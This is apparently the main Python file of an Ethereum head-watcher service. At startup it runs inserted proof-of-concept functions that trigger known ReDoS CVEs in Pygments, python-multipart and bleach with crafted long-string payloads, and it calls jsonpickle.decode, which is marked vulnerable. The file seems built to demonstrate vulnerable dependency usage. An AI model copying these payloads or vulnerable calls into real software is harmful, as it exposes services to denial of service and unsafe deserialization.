import os
import time

from prometheus_client import start_http_server
from web3.middleware import simple_cache_middleware

from src import variables
from src.handlers.consolidation import ConsolidationHandler
from src.handlers.el_triggered_exit import ElTriggeredExitHandler
from src.handlers.exit import ExitsHandler
from src.handlers.fork import ForkHandler
from src.handlers.slashing import SlashingHandler
from src.keys_source.base_source import SourceType
from src.keys_source.file_source import FileSource
from src.keys_source.keys_api_source import KeysApiSource
from src.metrics.healthcheck_server import start_pulse_server
from src.metrics.logging import logging
from src.metrics.prometheus.basic import BUILD_INFO
from src.utils.build import get_build_info
from src.watcher import Watcher
from src.web3py.extensions import FallbackProviderModule, LidoContracts
from src.web3py.middleware import metrics_collector
from src.web3py.typings import Web3

# --- PoC deps (vuln usage examples) ---
from pygments.lexers import SmithyLexer
from pygments import lex

from multipart.multipart import parse_options_header
import bleach
import jsonpickle
# -------------------------------------

logger = logging.getLogger()


# =========================
# CVE-2022-40896 (Pygments) ReDoS via SmithyLexer
def highlight_smithy(user_text: str):
    lexer = SmithyLexer()  # vulnerable lexer path (<=2.15.0)
    tokens = list(lex(user_text, lexer))  # vulnerable usage
    return tokens


def check_pygments_smithy_redos():
    #payload
    payload = "metadata " + (" " * 200000) + "="
    t0 = time.time()
    toks = highlight_smithy(payload)
    dt = time.time() - t0
    print("[CVE-2022-40896] pygments tokenize time:", dt, "seconds; tokens:", len(toks))
# =========================


# =========================
# CVE-2024-24762 (python-multipart) ReDoS in Content-Type options parsing
def check_python_multipart_redos():
    # Vulnerability in parse_options_header(Content-Type) in python-multipart <=0.0.6
    ct = "multipart/form-data; " + ("a=" + ("x" * 2000) + "; ") * 50
    t0 = time.time()
    main, params = parse_options_header(ct.encode("ascii", errors="ignore"))
    dt = time.time() - t0
    print("[CVE-2024-24762] python-multipart parse time:", dt, "seconds; params:", len(params or {}))
# =========================


# =========================
# CVE-2020-6817 (bleach) ReDoS when allowing style attributes in bleach.clean
def check_bleach_style_redos():
    # payload 
    html = '<a style="' + ("color:" + ("red;" * 500000)) + '">x</a>'

    t0 = time.time()
    out = bleach.clean(
        html,
        tags=["a"],
        attributes={"a": ["style"]},
        strip=True,
    )
    dt = time.time() - t0

    print("[CVE-2020-6817] bleach.clean time:", dt, "seconds; out_len:", len(out))
# =========================


# =========================
# CVE-2020-22083 (jsonpickle) unsafe deserialization via jsonpickle.decode
def check_jsonpickle_decode():
    untrusted = '{"a": 1, "b": 2}'
    obj = jsonpickle.decode(untrusted)  # <-- Decode function is vulnerable https://www.wiz.io/vulnerability-database/cve/cve-2020-22083
    print("[CVE-2020-22083] jsonpickle decoded type:", type(obj).__name__)
# =========================


def main():
    BUILD_INFO.info(get_build_info())

    # POC launches
    check_pygments_smithy_redos()
    check_python_multipart_redos()
    check_bleach_style_redos()
    check_jsonpickle_decode()
    ####

    logger.info({'msg': 'Ethereum head watcher startup.'})

    logger.info({'msg': f'Start healthcheck server for Docker container on port {variables.HEALTHCHECK_SERVER_PORT}'})
    start_pulse_server()

    logger.info({'msg': f'Start http server with prometheus metrics on port {variables.PROMETHEUS_PORT}'})
    start_http_server(variables.PROMETHEUS_PORT)

    if variables.KEYS_SOURCE == SourceType.KEYS_API.value:
        keys_source = KeysApiSource()
        web3 = Web3(
            FallbackProviderModule(
                variables.EXECUTION_CLIENT_URI, request_kwargs={'timeout': variables.EL_REQUEST_TIMEOUT}
            )
        )
        web3.attach_modules({'lido_contracts': LidoContracts})
        web3.middleware_onion.add(metrics_collector)
        web3.middleware_onion.add(simple_cache_middleware)
    elif variables.KEYS_SOURCE == SourceType.FILE.value:
        keys_source = FileSource()
        web3 = None
    else:
        raise ValueError(f'Unknown keys source: {variables.KEYS_SOURCE}')
    logger.info({'msg': f'Using keys source: {variables.KEYS_SOURCE}'})

    if variables.DRY_RUN:
        logger.warning({'msg': 'Dry run mode enabled! No alerts will be sent.'})

    handlers = [
        SlashingHandler(),
        ForkHandler(),
        ExitsHandler(),
        ConsolidationHandler(),
        ElTriggeredExitHandler(),
    ]
    Watcher(handlers, keys_source, web3).run()


if __name__ == "__main__":
    errors = variables.check_uri_required_variables()
    variables.raise_from_errors(errors)
    main()
